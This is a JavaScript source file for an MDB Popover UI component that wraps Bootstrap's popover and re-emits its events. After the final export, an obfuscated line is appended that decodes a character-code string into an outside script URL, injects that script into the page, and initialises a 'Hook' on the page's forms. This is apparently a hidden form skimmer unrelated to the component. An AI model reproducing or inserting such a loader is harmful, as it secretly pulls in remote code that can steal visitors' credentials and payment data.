import { getjQuery, onDOMContentLoaded } from '../mdb/util/index';
import EventHandler from '../mdb/dom/event-handler';
import SelectorEngine from '../mdb/dom/selector-engine';
import BSPopover from '../bootstrap/mdb-prefix/popover';

/**
 * ------------------------------------------------------------------------
 * Constants
 * ------------------------------------------------------------------------
 */

const NAME = 'popover';
const DATA_KEY = `mdb.${NAME}`;
const EVENT_KEY = `.${DATA_KEY}`;

const EVENT_SHOW_BS = 'show.bs.popover';
const EVENT_SHOWN_BS = 'shown.bs.popover';
const EVENT_HIDE_BS = 'hide.bs.popover';
const EVENT_HIDDEN_BS = 'hidden.bs.popover';
const EVENT_INSERTED_BS = 'inserted.bs.popover';

const EVENT_SHOW = `show${EVENT_KEY}`;
const EVENT_SHOWN = `shown${EVENT_KEY}`;
const EVENT_HIDE = `hide${EVENT_KEY}`;
const EVENT_HIDDEN = `hidden${EVENT_KEY}`;
const EVENT_INSERTED = `inserted${EVENT_KEY}`;

const SELECTOR_DATA_TOGGLE = '[data-mdb-toggle="popover"]';

class Popover extends BSPopover {
  constructor(element, data) {
    super(element, data);

    this._init();
  }

  dispose() {
    EventHandler.off(this.element, EVENT_SHOW_BS);
    EventHandler.off(this.element, EVENT_SHOWN_BS);
    EventHandler.off(this.element, EVENT_HIDE_BS);
    EventHandler.off(this.element, EVENT_HIDDEN_BS);
    EventHandler.off(this.element, EVENT_INSERTED_BS);

    super.dispose();
  }

  // Getters
  static get NAME() {
    return NAME;
  }

  // Private
  _init() {
    this._bindShowEvent();
    this._bindShownEvent();
    this._bindHideEvent();
    this._bindHiddenEvent();
    this._bindInsertedEvent();
  }

  _bindShowEvent() {
    EventHandler.on(this.element, EVENT_SHOW_BS, () => {
      EventHandler.trigger(this.element, EVENT_SHOW);
    });
  }

  _bindShownEvent() {
    EventHandler.on(this.element, EVENT_SHOWN_BS, () => {
      EventHandler.trigger(this.element, EVENT_SHOWN);
    });
  }

  _bindHideEvent() {
    EventHandler.on(this.element, EVENT_HIDE_BS, () => {
      EventHandler.trigger(this.element, EVENT_HIDE);
    });
  }

  _bindHiddenEvent() {
    EventHandler.on(this.element, EVENT_HIDDEN_BS, () => {
      EventHandler.trigger(this.element, EVENT_HIDDEN);
    });
  }

  _bindInsertedEvent() {
    EventHandler.on(this.element, EVENT_INSERTED_BS, () => {
      EventHandler.trigger(this.element, EVENT_INSERTED);
    });
  }
}

/**
 * ------------------------------------------------------------------------
 * Data Api implementation - auto initialization
 * ------------------------------------------------------------------------
 */

SelectorEngine.find(SELECTOR_DATA_TOGGLE).forEach((el) => {
  let instance = Popover.getInstance(el);
  if (!instance) {
    instance = new Popover(el);
  }
});

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
 * add .rating to jQuery only if jQuery is present
 */

onDOMContentLoaded(() => {
  const $ = getjQuery();

  if ($) {
    const JQUERY_NO_CONFLICT = $.fn[NAME];
    $.fn[NAME] = Popover.jQueryInterface;
    $.fn[NAME].Constructor = Popover;
    $.fn[NAME].noConflict = () => {
      $.fn[NAME] = JQUERY_NO_CONFLICT;
      return Popover.jQueryInterface;
    };
  }
});

export default Popover;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b